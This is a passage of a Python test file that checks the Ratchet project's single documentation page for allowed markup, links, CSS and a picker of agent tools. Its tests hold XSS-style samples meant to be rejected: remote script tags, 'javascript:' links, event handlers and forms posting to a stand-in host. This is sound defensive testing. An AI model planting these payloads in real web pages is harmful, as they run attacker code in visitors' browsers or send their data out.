    duplicates = sorted(set(each for each in reader.ids if reader.ids.count(each) > 1))
    if duplicates:
        found.append("%s: ids that stand more than once: %s" % (name, ", ".join(duplicates)))
    # The page is the one page in docs/ (FILES), so its ids, as html.parser read them, are the ids a fragment may name.
    for where, value in reader.links:
        problem = link_problem(root, value, {PAGE: reader.ids})
        if problem:
            found.append("%s: %s: the link %r %s" % (name, where, value, problem))
    for item in reader.items:
        if item["list"] == "flow" and not any(into_repo(href) for href, _ in item["links"]):
            found.append("%s: %s: a step that links nowhere in this repo. Each step links to where the repo shows it"
                         % (name, item["where"]))
    found += ["%s: %s" % (name, problem) for problem in css_problems("".join(reader.styles))]
    found += figure_problems(root, "".join(reader.styles))
    found += ["%s: %s" % (name, problem) for problem in example_problems(root, text)]
    found += ["%s: %s" % (name, problem) for problem in watch_problems(root)]
    found += ["%s: %s" % (name, problem) for problem in short_problems(text) + top_problems(root, text)]
    found += ["%s: %s" % (name, problem) for problem in principles_problems(root)]
    found += ["%s: %s" % (name, problem) for problem in picker_problems(text, "".join(reader.styles)) + prompt_problems(root, text)]
    readme_path = os.path.join(root, "README.md")
    with open(readme_path, encoding="utf-8", errors="strict") as handle:
        allowed = readme_commands(handle.read())
    for command in reader.commands:
        if command not in allowed:
            found.append("%s: the command %r is not a line of a code block marked sh in README.md" % (name, command))
    if not reader.commands:
        found.append("%s: holds no command" % name)
    return problems + found


def example_problems(root, text):
    """Why what the page says of a rule is not what ratchet.json holds, as messages, or nothing.

    Each key the page names in <code> is a rule. The rule of the example names a check, its ratchet starts with
    EXAMPLE_CHECK, and while the page says EXAMPLE_NOT_SHIPPED, the rule has no reference check that Ratchet ships.
    """
    with open(os.path.join(root, "ratchet.json"), encoding="utf-8") as handle:
        rules = dict((rule["key"], rule) for rule in json.load(handle)["rules"])
    problems = ["names %s, which is not a rule in ratchet.json" % key for key in PAGE_KEY.findall(text) if key not in rules]
    rule = rules.get(EXAMPLE_KEY)
    if EXAMPLE_KEY in text and rule is not None:
        if rule["enforcement"] != "enforced" or not rule["ratchet"].startswith(EXAMPLE_CHECK):
            problems.append('the example says %s names a secret scan in every pull request, and its ratchet in ratchet.json does '
                            'not start "%s"' % (EXAMPLE_KEY, EXAMPLE_CHECK))
        if EXAMPLE_NOT_SHIPPED in text and rule.get("reference_check"):
            problems.append('says "%s", and %s has a reference check in ratchet.json' % (EXAMPLE_NOT_SHIPPED, EXAMPLE_KEY))
    return problems


def short_problems(text):
    """Why the page is not short, as messages, or nothing: WORDS words or more outside its CSS, headings other than
    HEADINGS, or a number of links of the class button other than one. That the one is BUTTON is a test of its own."""
    problems = []
    words = len(re.sub(r"<[^>]+>", " ", text[text.index("</style>"):]).split())
    if words >= WORDS:
        problems.append("the page has %d words outside its CSS, and must have under %d" % (words, WORDS))
    reader = PageReader()
    reader.feed(text)
    levels = [level for _, level in reader.headings]
    if levels != HEADINGS:
        problems.append("its headings are %r, and must be %r" % (levels, HEADINGS))
    buttons = len(re.findall(r'class="[^"]*\bbutton\b[^"]*"', text))
    if buttons != 1:
        problems.append("the page holds %d links of the class button, and must hold one, the one thing to do" % buttons)
    return problems


def page_sample(text):
    """The lines of the one sample of the dry run on the page, or None when it does not stand there once."""
    found = SAMPLE.findall(text)
    return html.unescape(found[0]).split("\n") if len(found) == 1 and text.count('class="sample"') == 1 else None


def top_problems(root, text):
    """Why what the top of the page says of the project is not what the repo holds, as messages, or nothing.

    While the page says BEFORE_ONE, the version of ratchet.json is below 1.0. While it says the license is MIT, LICENSE
    starts "MIT License". The sample of the dry run stands once, and its first line is "$ " and a command of README.md.
    That its other lines are lines checks/init.py --check prints is a test of test_init.py, which runs it.
    """
    problems = []
    with open(os.path.join(root, "ratchet.json"), encoding="utf-8") as handle:
        version = json.load(handle)["version"]
    if BEFORE_ONE in text and not re.match(r"0\.[0-9]+\Z", version):
        problems.append('says "%s", and the version of ratchet.json is %s' % (BEFORE_ONE, version))
    with open(os.path.join(root, "LICENSE"), encoding="utf-8") as handle:
        license_text = handle.read()
    if LICENSED in text and not license_text.startswith("MIT License\n"):
        problems.append('says the license is MIT, and LICENSE does not start "MIT License"')
    sample = page_sample(text)
    if sample is None or len(sample) < 2:
        return problems + ['holds one sample of the dry run, a <pre class="sample"> of text only, with the command and what it prints']
    with open(os.path.join(root, "README.md"), encoding="utf-8", errors="strict") as handle:
        allowed = readme_commands(handle.read())
    if not sample[0].startswith("$ ") or sample[0][2:] not in allowed:
        problems.append("the first line of the sample, %r, is not \"$ \" and a command: %r is not a line of a code block marked sh in "
                        "README.md" % (sample[0], sample[0][2:]))
    return problems


def watch_problems(root):
    """Why the watch is not the daily one the page names, as messages, or nothing: the workflow holds one cron line, of
    one run a day at a fixed minute and hour, and the line that runs the watch on sources.json, once."""
    path = os.path.join(root, *WATCH.split("/"))
    if os.path.islink(path) or not os.path.isfile(path):
        return ["the line of the sources names a daily watch, and %s is not there" % WATCH]
    with open(path, encoding="utf-8", errors="strict") as handle:
        lines = handle.read().split("\n")
    crons = [line for line in lines if "cron" in line]
    runs = [line for line in lines if line == WATCH_RUN]
    if len(crons) != 1 or not WATCH_CRON.match(crons[0]) or len(runs) != 1:
        return ['the line of the sources names a daily watch, and %s must hold one line of the form - cron: "M H * * *" and '
                'the line "%s", once each. Found %d lines that hold cron, %s, and that line %d times'
                % (WATCH, WATCH_RUN.strip(), len(crons), "of that form" if len(crons) == 1 and WATCH_CRON.match(crons[0])
                   else "not one of that form", len(runs))]
    return []


class PickerReader(html.parser.HTMLParser):
    """Reads the page for its picker: how many <fieldset> it holds, and each element directly in the first of the class
    PICKER, in order, as [its tag, its attributes, what it holds as the page writes it]. Text directly in the
    <fieldset> is counted too, since the picker holds none."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.fieldsets, self.depth, self.done, self.children, self.stray = 0, None, False, [], 0

    def handle_starttag(self, tag, attrs):
        if tag == "fieldset":
            self.fieldsets += 1
            if self.depth is None and not self.done and dict(attrs) == {"class": PICKER}:
                self.depth = 0
                return
        if self.depth is None:
            return
        if self.depth == 0:
            self.children.append([tag, dict(attrs), []])
        else:
            self.children[-1][2].append(self.get_starttag_text())
        if tag not in VOID:
            self.depth += 1

    def handle_endtag(self, tag):
        if self.depth is None or tag in VOID:
            return
        if self.depth == 0:
            self.depth, self.done = None, True
            return
        self.depth -= 1
        if self.depth:
            self.children[-1][2].append("</%s>" % tag)

    def handle_data(self, data):
        if self.depth:
            self.children[-1][2].append(data)
        elif self.depth == 0 and data.strip():
            self.stray += 1


def picker_problems(text, css, files=init.INSTRUCTION_FILES):
    """Why the picker is not the one of TOOLS, or says of a file what checks/init.py does not do, as messages, or nothing.

    The page holds one <fieldset>, of the class PICKER: a <legend>, then a radio and its <label> for each agent of
    TOOLS, in order, the first checked and no other, then one line for each, in the same order. The CSS holds, for each,
    the selector that shows the line of the radio that is checked, and no other selector reads :checked that way. A line
    names in <code> only its agent's file and init.py, and the line of an agent in ALSO_NAMED names that file too. files is what init.py reads to choose adopt mode: a line says
    init.py sees its file only when the file is one of them, and says it does not, with the link to TRYING.md, only when
    it is not.
    """
    reader = PickerReader()
    reader.feed(text)
    reader.close()
    if reader.fieldsets != 1 or not reader.done:
        return ['holds one picker, a <fieldset class="%s"> that is closed, and no other <fieldset>. Found <fieldset> %d times'
                % (PICKER, reader.fieldsets)]
    problems = []
    if reader.stray:
        problems.append("the picker holds text that stands in none of its elements")
    expected = ["legend"] + ["input", "label"] * len(TOOLS) + ["p"] * len(TOOLS)
    tags = [tag for tag, _, _ in reader.children]
    if tags != expected:
        return problems + ["the picker holds a <legend>, then an <input> and its <label> for each of %d agents, then a <p> for each. "
                           "Found %s" % (len(TOOLS), ", ".join("<%s>" % tag for tag in tags) or "nothing")]
    if not "".join(reader.children[0][2]).strip():
        problems.append("the <legend> of the picker names it, and is empty")
    for number, (slug, label, file, seen) in enumerate(TOOLS):
        radio, name, line = reader.children[1 + 2 * number], reader.children[2 + 2 * number], reader.children[1 + 2 * len(TOOLS) + number]
        wanted = dict(RADIO, id="tool-%s" % slug, **({"checked": "checked"} if number == 0 else {}))
        if radio[1] != wanted:
            problems.append("radio %d of the picker is %r, and must be %r: the first is checked, and no other" % (number + 1, radio[1], wanted))
        if name[1] != {"for": "tool-%s" % slug} or "".join(name[2]) != label:
            problems.append("label %d of the picker is %r with %r, and must be for tool-%s with %r"
                            % (number + 1, name[1], "".join(name[2]), slug, label))
        said = "".join(line[2])
        if line[1] != {"class": "where for-%s" % slug}:
            problems.append('line %d of the picker has %r, and must have class="where for-%s"' % (number + 1, line[1], slug))
        if SHOWN % (slug, slug) not in css:
            problems.append("the CSS does not hold %s, which shows the line of %s when its radio is checked" % (SHOWN % (slug, slug), label))
        named = set(PANEL_CODE.findall(said)) - {"init.py"}
        wanted = ({file} if file else set()) | ({ALSO_NAMED[slug]} if slug in ALSO_NAMED else set())
        if named != wanted:
            problems.append("the line of %s names %s in <code>, and must name %s and init.py only"
                            % (label, ", ".join(sorted(named)) or "no file", ", ".join(sorted(wanted)) or "no file"))
        if file is None:
            continue
        if seen != (file in files):
            problems.append("the page says checks/init.py %s %s, the file of %s, and INSTRUCTION_FILES of checks/init.py says otherwise"
                            % ("sees" if seen else "does not see", file, label))
        if seen and (SEES not in said or NOT_SEEN in said):
            problems.append('the line of %s must say "%s", and not that init.py does not see the file' % (label, SEES))
        if not seen and (NOT_SEEN not in said or SEES in said or INVENTORY_FIRST not in said):
            problems.append('the line of %s must say "%s", link to TRYING.md as %s, and not say that init.py sees the file'
                            % (label, NOT_SEEN, INVENTORY_FIRST))
    if css.count(":checked ~") != len(TOOLS):
        problems.append("the CSS reads :checked ~ %d times, and must read it once for each of the %d lines of the picker"
                        % (css.count(":checked ~"), len(TOOLS)))
    return problems


def page_prompt(text):
    """The lines of the one prompt on the page, between PROMPT_OPEN and the next PROMPT_CLOSE, each a line of its own
    and not indented, or None when the prompt does not stand there once."""
    lines = text.split("\n")
    if lines.count(PROMPT_OPEN) != 1 or text.count('id="prompt"') != 1:
        return None
    start = lines.index(PROMPT_OPEN)
    return lines[start + 1:lines.index(PROMPT_CLOSE, start)] if PROMPT_CLOSE in lines[start:] else None


def prompt_problems(root, text):
    """Why the prompt is not the one the test expects, as messages, or nothing: PROMPT_LINES with the command that
    fetches Ratchet at the newest version with a date in CHANGELOG.md, each command of it a line of a code block marked
    sh in README.md, and the file it tells the agent to follow a file of this checkout."""
    prompt = page_prompt(text)
    if prompt is None:
        return ['holds one prompt, the line %s, then the lines of the prompt, then the line %s' % (PROMPT_OPEN, PROMPT_CLOSE)]
    problems = []
    released = generate.changelog_context(root)[1]
    expected = [line % (FETCH % released) if "%s" in line else line for line in PROMPT_LINES]
    if prompt != expected:
        problems.append("the prompt is not the one the test expects at v%s: %r, and must be %r" % (released, prompt, expected))
    with open(os.path.join(root, "README.md"), encoding="utf-8", errors="strict") as handle:
        allowed = readme_commands(handle.read())
    commands = [line[3:] for line in prompt if line.startswith("   ")]
    for command in commands:
        if command not in allowed:
            problems.append("the command %r of the prompt is not a line of a code block marked sh in README.md" % command)
    if not commands:
        problems.append("the prompt holds no command, a line indented by three spaces")
    if PROMPT_FOLLOWS in " ".join(prompt) and not os.path.isfile(os.path.join(root, PROMPT_FOLLOWS)):
        problems.append("the prompt tells the agent to follow %s, which is not a file in this checkout" % PROMPT_FOLLOWS)
    return problems


def link_problem(root, value, ids):
    """Why a link on the page is not allowed, or None. ids maps each page in docs/ to the ids on it.

    A link into the repo may end in a fragment of the form of an id, which is not checked against GitHub. A link
    to a page in docs/, or to "#..." on this page, has a fragment only if it is an id on that page. Nothing links
    out of the repo.
    """
    if value.startswith(REPO):
        match = REPO_LINK.match(value[len(REPO):])
        if not match:
            return ("goes into the repo, but not to the repo, a file or directory on main, a pull request, an issue, the list "
                    "of issues or the latest release")
        if match.group("kind"):
            target = os.path.join(root, *match.group("path").split("/"))
            if match.group("kind") == "blob" and not os.path.isfile(target):
                return "names a file that is not in this checkout"
            if match.group("kind") == "tree" and not os.path.isdir(target):
                return "names a directory that is not in this checkout"
        return None
    target, mark, fragment = value.partition("#")
    nowhere = "leads neither to a file in %s/, nor to an id on the page, nor into the repo on GitHub" % DOCS
    if target and not (FILE.match(target) and target in FILES and target != ".nojekyll"):
        return nowhere
    if not mark:
        return None if target else nowhere
    page = target or PAGE
    if page not in ids:
        return "has a fragment, and only a link to a page in %s/ may have a fragment" % DOCS
    if not FRAGMENT.match(mark + fragment) or fragment not in ids[page]:
        return "names #%s, which is not an id on %s" % (fragment, page)
    return None


def into_repo(href):
    """Whether a link leads into this repo on GitHub, as a step must: not out of it, and not to this page."""
    return isinstance(href, str) and (href == REPO or href.startswith(REPO + "/"))


def lines_that_hold(text, marker):
    """The lines of the page that hold marker, without the spaces that indent them, as generate.py reads them."""
    return [line.lstrip(" ") for line in text.split("\n") if marker in line]


class Page(RepoCopy, unittest.TestCase):
    """The page as it stands passes, and each change below fails with its message."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        text = self.page()
        self.assertIn(old, text, "the test expects %r on the page" % old)
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text.replace(old, new, 1))

    def assert_fails(self, *message):
        """One problem holds every part of the message."""
        problems = page_problems(self.copy)
        self.assertTrue(any(all(part in problem for part in message) for problem in problems), "%r not in %r" % (message, problems))

    def test_the_page_as_it_stands_passes(self):
        self.assertEqual(page_problems(ROOT), [])
        self.assertEqual(page_problems(self.copy), [])

    def test_the_page_names_what_it_must(self):
        text = self.page()
        released = generate.changelog_context(self.copy)[1]
        for words in (FETCH % released, "python3 .ratchet/checks/init.py --check", "python3 .ratchet/checks/init.py</code>",
                      REPO + "/releases/latest", REPO + "/blob/main/LICENSE", 'href="%s"' % REPO,
                      "<h2 id=\"start-here\">Start here</h2>", "prefers-color-scheme: dark", '<section id="values" class="values">',
                      '<h2 id="how-it-works">How it works</h2>', REPO + "/blob/main/RATCHET.md#the-principles",
                      REPO + "/blob/main/README.md", REPO + "/blob/main/STARTING.md", REPO + "/blob/main/TRYING.md",
                      '<a class="repo" href="%s"><svg class="mark" viewBox="0 0 16 16" width="20" height="20" aria-hidden="true">' % REPO,
                      "</path></svg> GitHub</a>", '<h2 id="the-principles">The principles</h2>',
                      BUTTON, "<strong>Beta.</strong> " + BEFORE_ONE, REPO + "/blob/main/CHANGELOG.md", LICENSED,
                      'href="%s/issues"' % REPO, REPO + "/blob/main/SECURITY.md", "<strong>Planned:</strong>",
                      "<strong>Maintainer:</strong> one person, <code>fabian-von-tiedemann</code> on GitHub",
                      "<code>ratchet.no-secrets</code> names a secret scan in every pull request", EXAMPLE_NOT_SHIPPED,
                      'id="sources"', '<fieldset class="tools">', PROMPT_OPEN,
                      "Do not commit, push, or make a check required without asking me first.",
                      "It has been tried in Claude Code and Codex, not in the others"):
            self.assertIn(words, text)

    def test_the_page_is_short(self):
        self.assertEqual(short_problems(self.page()), [])

    def test_a_page_that_is_long_or_has_other_headings_or_a_second_button_fails(self):
        for old, new, message in (("<h1>Ratchet</h1>", "<h1>Ratchet</h1>" + "<p>%s</p>" % " ".join(["word"] * 30), "words outside its CSS"),
                                  ('<h2 id="behind-it">Who is behind it</h2>', "<p>Who is behind it</p>", "its headings are"),
                                  ("</main>", "<section><h2>One more</h2></section></main>", "its headings are"),
                                  ('<a href="%s">Star' % REPO, '<a class="button" href="%s">Star' % REPO, "of the class button"),
                                  (BUTTON, '<a href="#start-here">Try it on your repo</a>', "of the class button")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                problems = short_problems(self.page())
                self.assertTrue(any(message in problem for problem in problems), problems)

    def test_what_the_top_says_of_the_project_is_what_the_repo_holds(self):
        self.assertEqual(top_problems(self.copy, self.page()), [])
        self.edit("ratchet.json", '"version": "0.', '"version": "1.')
        self.assertIn('says "Before 1.0"', " ".join(top_problems(self.copy, self.page())))
        self.setUp()
        self.edit("LICENSE", "MIT License", "Another License")
        self.assertIn("says the license is MIT", " ".join(top_problems(self.copy, self.page())))
        self.setUp()
        self.change('<pre class="sample">$ python3', '<pre class="sample">$ sudo python3')
        self.assertIn("is not a line of a code block marked sh in README.md", " ".join(top_problems(self.copy, self.page())))
        self.setUp()
        self.change('<pre class="sample">', '<pre class="other">')
        self.assertIn("one sample of the dry run", " ".join(top_problems(self.copy, self.page())))

    def test_no_page_fails(self):
        shutil.rmtree(os.path.join(self.copy, DOCS))
        self.assert_fails("docs/: there is no such directory")

    def test_a_file_in_docs_that_is_not_known_fails(self):
        for extra in ("404.html", "CNAME", "_config.yml"):
            with self.subTest(extra=extra):
                self.setUp()
                with open(os.path.join(self.copy, DOCS, extra), "w", encoding="utf-8") as handle:
                    handle.write("x\n")
                self.assert_fails("docs/ must hold exactly")

    def test_no_nojekyll_fails(self):
        os.remove(os.path.join(self.copy, DOCS, ".nojekyll"))
        self.assert_fails("docs/ must hold exactly")

    def test_a_logo_that_is_not_the_repos_fails(self):
        with open(os.path.join(self.copy, DOCS, "ratchet-dark.svg"), "a", encoding="utf-8") as handle:
            handle.write("<!-- -->\n")
        self.assert_fails("docs/ratchet-dark.svg is not byte for byte assets/ratchet-dark.svg")

    def test_a_page_that_is_not_utf8_fails(self):
        with open(os.path.join(self.copy, DOCS, PAGE), "ab") as handle:
            handle.write(b"\xff\n")
        self.assert_fails("docs/index.html: not valid UTF-8 at byte")

    def test_a_hidden_character_fails(self):
        for character in ("\r", "\t", "\u202e", "\u200b", "\ufeff", "\x00"):
            with self.subTest(code="%04X" % ord(character)):
                self.setUp()
                self.change("<h1>Ratchet</h1>", "<h1>Ratchet%s</h1>" % character)
                self.assert_fails("holds U+%04X" % ord(character))

    def test_a_page_without_its_doctype_fails(self):
        self.change("<!DOCTYPE html>\n", "")
        self.assert_fails("does not start with <!DOCTYPE html>")

    def test_a_script_fails_in_every_form(self):
        for script in ('<script src="https://example.invalid/t.js"></script>', "<script>document.title = 'x'</script>",
                       '<SCRIPT src="t.js"></SCRIPT>', '<iframe src="https://example.invalid/"></iframe>',
                       '<object data="https://example.invalid/x"></object>', '<embed src="https://example.invalid/x">',
                       '<base href="https://example.invalid/">', '<form action="https://example.invalid/"></form>',
                       '<svg><image href="https://example.invalid/x.png"></image></svg>', '<audio src="x.mp3"></audio>',
                       '<svg><script>alert(1)</script></svg>', '<svg><use href="#why"></use></svg>',
                       "<svg><foreignObject><p>x</p></foreignObject></svg>", '<svg><animate attributeName="x"></animate></svg>',
                       '<svg><set attributeName="x"></set></svg>', '<svg><g></g></svg>', '<svg><circle r="1"></circle></svg>',
                       '<use href="#why"></use>', "<foreignObject><p>x</p></foreignObject>", '<animate attributeName="x"></animate>'):
            with self.subTest(script=script):
                self.setUp()
                self.change("</main>", script + "\n</main>")
                self.assert_fails("is not an element this page may hold")

    def test_an_input_that_is_not_a_radio_of_the_picker_or_a_control_that_sends_something_fails(self):
        radio = '<input type="radio" name="tool" id="tool-codex">'
        for old, new, message in (
                (radio, '<input type="text" name="tool" id="tool-codex">', "an <input> is a radio of the picker"),
                (radio, '<input type="submit" name="tool" id="tool-codex">', "an <input> is a radio of the picker"),
                (radio, '<input type="radio" name="other" id="tool-codex">', "an <input> is a radio of the picker"),
                (radio, '<input name="tool" id="tool-codex">', "an <input> is a radio of the picker"),
                (radio, '<input type="radio" name="tool" id="tool-codex" checked="">', 'checked is written checked="checked"'),
                (radio, '<input type="radio" name="tool" id="tool-codex" checked>', "has the attribute checked without a value"),
                (radio, '<input type="radio" name="tool" id="tool-codex" formaction="https://example.invalid/">',
                 "<input> may not have the attribute formaction"),
                (radio, '<input type="radio" name="tool" id="tool-codex" onchange="x()">', "<input> may not have the attribute onchange"),
                (radio, '<input type="radio" name="tool" id="tool-codex" value="x">', "<input> may not have the attribute value"),
                (radio, '<input type="image" name="tool" id="tool-codex" src="https://example.invalid/x.png">',
                 "<input> may not have the attribute src"),
                (radio, radio + "</input>", "</input> closes a void element"),
                ("</main>", '<input type="radio" name="tool" id="tool-more">\n</main>', "<input> stands directly in the <fieldset>"),
                ("</main>", '<label for="tool-codex">Codex</label>\n</main>', "<label> stands directly in the <fieldset>"),
                ("</main>", "<button>Copy</button>\n</main>", "<button> is not an element this page may hold"),
                ("</main>", "<textarea>x</textarea>\n</main>", "<textarea> is not an element this page may hold"),
                ("</main>", "<select><option>x</option></select>\n</main>", "<select> is not an element this page may hold"),
                ('<fieldset class="tools">', '<form action="https://example.invalid/"><fieldset class="tools">',
                 "<form> is not an element this page may hold")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_an_inline_svg_that_is_more_than_the_mark_fails(self):
        mark = '<svg class="mark" viewBox="0 0 16 16" width="20" height="20" aria-hidden="true"><path d="M8 0'
        for old, new, message in (
                (mark, mark.replace('<svg class="mark"', '<svg class="mark" onload="alert(1)"'), "<svg> may not have the attribute onload"),
                (mark, mark.replace('<svg class="mark"', '<svg class="mark" style="fill: red"'), "<svg> may not have the attribute style"),
                (mark, mark.replace('<svg class="mark"', '<svg class="mark" role="img" aria-labelledby="t"'), "<svg> may not have the attribute role"),
                (mark, mark.replace("<path d=", '<path onclick="x" d='), "<path> may not have the attribute onclick"),
                (mark, mark.replace("<path d=", '<path href="https://example.invalid/" d='), "<path> may not have the attribute href"),
                (mark, mark.replace("<path d=", '<path xlink:href="#x" d='), "<path> may not have the attribute xlink:href"),
                (mark, mark.replace("<path d=", '<path fill="url(#g)" d='), "<path> may not have the attribute fill"),
                (mark, mark.replace('<path d="M8 0', '<path d="M8 0; url(x) '), "and a value in an <svg> is numbers and words"),
                (mark, mark.replace('viewBox="0 0 16 16"', 'viewBox="javascript:x"'), "and a value in an <svg> is numbers and words"),
                (mark, mark.replace('class="mark"', 'class="url(#x)"'), "and a value in an <svg> is numbers and words"),
                (mark, mark.replace("<path d=", "<title>x</title><path d="), "an <svg> holds only <path>, found <title>"),
                (mark, mark.replace("<path d=", '<a href="%s">x</a><path d=' % REPO), "an <svg> holds only <path>, found <a>"),
                (mark, mark.replace("<path d=", "<p>x</p><path d="), "an <svg> holds only <path>, found <p>"),
                (mark, mark.replace("<path d=", '<svg viewBox="0 0 1 1"></svg><path d='), "an <svg> holds only <path>, found <svg>"),
                (mark, mark.replace("<path d=", "words <path d="), "text in an <svg>, which holds no text"),
                ("</main>", '<path d="M0 0 L1 1"></path>\n</main>', "<path> stands directly in an <svg>, and nowhere else"),
                ("</main>", '<svg viewBox="0 0 1 1" width="1" height="1" aria-hidden="true"><path d="M0 0"></path></svg>\n</main>',
                 "holds <svg> 2 times, and must hold it 1 times"),
                (mark, '<path d="M8 0', "<path> stands directly in an <svg>, and nowhere else")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_an_event_handler_or_a_style_attribute_fails(self):
        for attribute, name in (('onload="x()"', "onload"), ('style="background: url(https://example.invalid/x.png)"', "style"),
                                ('srcset="https://example.invalid/x.png 2x"', "srcset"), ('loading="lazy"', "loading")):
            with self.subTest(attribute=attribute):
                self.setUp()
                self.change('<img src="ratchet-light.svg"', '<img %s src="ratchet-light.svg"' % attribute)
                self.assert_fails("<img> may not have the attribute %s" % name)

    def test_a_load_from_another_origin_fails(self):
        for old, new in (('<img src="ratchet-light.svg"', '<img src="https://example.invalid/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="//example.invalid/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="&#104;ttps://example.invalid/x.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="' + REPO + '/raw/main/assets/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="../assets/ratchet-light.svg"'),
                         ('srcset="ratchet-dark.svg"', 'srcset="https://example.invalid/ratchet-dark.svg"'),
                         ('<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="https://example.invalid/i.svg"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("and the page loads only a file in docs/ by its name")

    def test_a_stylesheet_or_a_font_from_elsewhere_fails(self):
        for rule, message in (("@import 'https://example.invalid/x.css';", "@import"),
                              ("@font-face { font-family: x; src: local(x); }", "@font-face"),
                              ("body { background: url(https://example.invalid/x.png); }", '"url"'),
                              ("body { background: URL(x.png); }", '"url"'),
                              ("body { background: u\\72l(x.png); }", "backslash"),
                              ("body { background: image-set('x.png' 1x); }", "image-set()"),
                              ("body { width: calc(1px + 1px); }", "calc()")):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails(message)
        self.setUp()
        self.change('<link rel="icon"', '<link rel="stylesheet"')
        self.assert_fails('the only <link> is rel="icon"')

    def test_a_link_out_of_the_repo_fails(self):
        for target in ("https://example.invalid/", "http://github.com/fabian-von-tiedemann/ratchet",
                       "https://github.com/fabian-von-tiedemann/ratchet-other", "https://github.com/fabian-von-tiedemann",
                       "javascript:alert(1)", "&#106;avascript:alert(1)", "mailto:x@example.invalid",
                       "https://fabian-von-tiedemann.github.io/ratchet/", "//example.invalid/",
                       # A source in sources.json is credited in RATCHET.md, which the page links to, and not on the page.
                       "https://github.com/mattpocock/skills", "https://github.com/cursor/plugins/tree/HEAD/pstack"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s"' % REPO, 'href="%s"' % target)
                self.assert_fails("the link")

    def test_a_link_into_the_repo_that_leads_nowhere_fails(self):
        for target, message in (("/blob/main/NOT-A-FILE.md", "names a file that is not in this checkout"),
                                ("/tree/main/not-a-directory", "names a directory that is not in this checkout"),
                                ("/blob/main/checks", "names a file that is not in this checkout"),
                                ("/blob/main/../../other/x", "goes into the repo, but not"),
                                ("/blob/other/README.md", "goes into the repo, but not"),
                                ("/settings", "goes into the repo, but not"),
                                ("/releases/latest/../../x", "goes into the repo, but not")):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
                self.assert_fails(message)

    def test_a_link_to_a_pull_request_or_an_issue_passes_and_one_of_another_form_fails(self):
        for target in ("/issues/49", "/pull/42", "/releases/latest", "/issues"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
                self.assertEqual(page_problems(self.copy), [])
        for target in ("/issues/0", "/issues/49/../../x", "/issues/", "/issues/new", "/issues?q=x", "/issues#reports", "/pull/0", "/pulls"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
                self.assert_fails("goes into the repo, but not")

    def test_a_relative_link_or_a_fragment_that_leads_nowhere_fails(self):
        for target in ("missing.html", "../README.md", "/index.html", "#no-such-id", ".nojekyll"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="#start-here"', 'href="%s"' % target)
                self.assert_fails("the link")

    def test_a_relative_link_to_the_page_passes(self):
        self.change('href="#start-here"', 'href="index.html#start-here"')
        self.assertEqual(page_problems(self.copy), [])

    def test_a_fragment_that_is_not_an_id_on_its_page_fails(self):
        # The first is a typo for the id start-here, in a link to the page by its name.
        for target in ("index.html#start-hree", "index.html#Start-here", "index.html#", "#missing", "#start-hree", "#"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="#start-here"', 'href="%s"' % target)
                self.assert_fails("the link %r" % target, "is not an id on")

    def test_a_fragment_on_a_link_to_a_file_that_is_not_a_page_fails(self):
        self.change('href="#start-here"', 'href="ratchet-light.svg#logo"')
        self.assert_fails("the link 'ratchet-light.svg#logo'", "only a link to a page in docs/ may have a fragment")

    def test_an_id_twice_on_the_page_fails(self):
        # The second start-here is one a link names, so the link would lead to either.
        self.change('<h2 id="how-it-works">', '<h2 id="start-here">')
        self.assert_fails("ids that stand more than once: start-here")

    def test_an_element_left_open_or_closed_out_of_order_fails(self):
        for old, new, message in (("</main>", "", "</body> does not close the element that is open, <main>"),
                                  ("<h1>Ratchet</h1>", "<h1><em>Ratchet</h1></em>", "</h1> does not close the element that is open, <em>"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1></p>", "</p> does not close"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><br></br>", "</br> closes a void element"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><p/>", "<p/> is not closed by its slash"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><!-- x -->", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><![CDATA[x]]>", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><?php ?>", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", '<h1 id="x" id="y">Ratchet</h1>', "has the attribute id twice"),
                                  ("<h1>Ratchet</h1>", "<h1 hidden>Ratchet</h1>", "may not have the attribute hidden"),
                                  ("<main>", "<main><title>x</title>", "a <title> stands in <head>, and nowhere else"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet<title>x</title></h1>", "a <title> stands in <head>, and nowhere else")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_the_page_is_accessible_as_far_as_the_test_reads(self):
        for old, new, message in (('<html lang="en">', "<html>", 'must have lang="en"'),
                                  ('alt="Ratchet logo"', 'alt=""', "an <img> without alt text"),
                                  ('alt="Ratchet logo"', "", "an <img> without alt text"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><h3>x</h3>", "<h3> after <h1> skips a level"),
